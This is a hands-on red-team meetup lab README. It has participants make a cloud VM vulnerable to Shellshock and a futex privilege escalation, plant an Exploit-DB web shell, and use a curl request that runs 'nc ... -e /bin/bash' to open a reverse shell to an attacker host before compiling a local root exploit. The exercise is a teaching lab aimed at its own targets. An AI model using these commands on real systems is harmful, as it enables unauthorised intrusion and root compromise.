# Launch Meetup and Hack Night

Refer to [Meetup page](https://www.meetup.com/redteamproject/events/259624820/) for details.

## Artifacts

* [Qwiklabs site](https://ce.qwiklabs.com/focuses/12629) (yes, the name doesn't make sense; I'm reusing another workshop)
* [Setup script](setup.sh), launch from Cloud Shell
* [Blue Ansible playbook](blue.yml)
* [Red Ansible playbook](red.yml)

## Instructions

1. Select your qwiklabs project from the dropdown menu in the top blue bar, i.e., ```qwiklabs-gcp-fa603bc97e11059a```
2. Start the Cloud Shell
3. Clone this repo

```
git clone https://github.com/redteam-project/meetup.git
cd meetup/20190321
```

4. Run the setup script `./setup.sh`
5. SSH to the blue instance `gcloud compute ssh blue-1 --zone us-east4-a`
6. Update and install packages

```
sudo su -
yum update -y
yum install -y git ansible python-pip
```

7. Clone the `meetup`, `cyber-range-target`, and `exploit-curation` repos

```
git clone https://github.com/redteam-project/meetup
git clone https://github.com/redteam-project/cyber-range-target
git clone https://github.com/redteam-project/exploit-curation
```

8. Make this instance vulnerable to Shellshock and libfutex

```
ansible-playbook meetup/20190321/blue.yml
```

9. Wait for the instance to reboot, then re-log in

```
gcloud compute ssh blue-1 --zone us-east4-a
```

10. Now scan for exploitable vulnerabilities with `lem`

```
sudo su -
virtualenv venv
source venv/bin/activate
pip install lem
lem host assess --curation exploit-curation --kind stride --score 090000
lem exploit copy --id 35146 --source exploit-database --destination /var/www/html --curation exploit-curation
mv /var/www/html/exploit-database-35146.txt /var/www/html/index.php
```

11. Our remote code execution vulnerability is now ready to exploit. Now start two new Cloud Shell instances and ssh to red-1 from both.

```
gcloud compute ssh red-1 --zone us-east4-a
```

12. In the first `red-1` shell, install Netcat and start a listener on port 4444.

```
yum install -y nmap-ncat
nc -nlv 4444
```

13. In the second `red-1` shell, exploit the Shellshock vulnerability we staged in step 10. Replace the IP addresses with your blue-1 and red-1 IPs, respectively.

```
curl -X GET 'http://10.150.0.6/index.php?cmd=nc%20-nv%2010.150.0.7%204444%20-e%20/bin/bash'
```

14. Now in the first `red-1` shell, you should have a reverse shell to `blue-1`. Use this Python trick to get a tty and invoke bash.

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

15. Create a virtualenv, install lem, and look for a privilege escalation vulnerability.

```
cd /tmp
virtualenv venv
source venv/bin/activate
pip install lem
git clone https://github.com/redteam-project/exploit-curation
lem host assess --curation exploit-curation --kind stride --score 000009
```

Note that there is currently a [bug](https://github.com/redteam-project/lem/issues/5) in lem that prevents the exploit that maps to CVE-2014-3153 from returning, but for purposes of this lab we know that it maps to EDBID 35370.

16. Stage the exploit and pop root. **EDIT** - this doesn't appear to work in GCE, so use your imagination.

```
lem exploit copy --curation /tmp/exploit-curation --source exploit-database --id 35370 --destination /tmp/
mv exploit-database-35370.txt exploit.c
gcc -lpthread exploit.c -o exploit
./exploit
id -a
```
